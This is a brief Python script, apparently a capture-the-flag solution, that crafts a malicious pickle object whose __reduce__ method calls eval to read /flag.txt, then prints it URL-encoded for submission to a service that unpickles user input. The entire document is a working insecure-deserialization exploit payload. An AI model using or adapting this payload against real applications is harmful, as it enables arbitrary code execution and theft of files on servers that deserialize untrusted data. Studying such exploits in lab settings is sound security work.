import os
import pickle
from urllib import parse


class exp(object):
    def __reduce__(self):
        return (eval,("open('/flag.txt').read()",))

a=exp()
s=pickle.dumps(a)
# print urllib.quote(s)
print(parse.quote(s))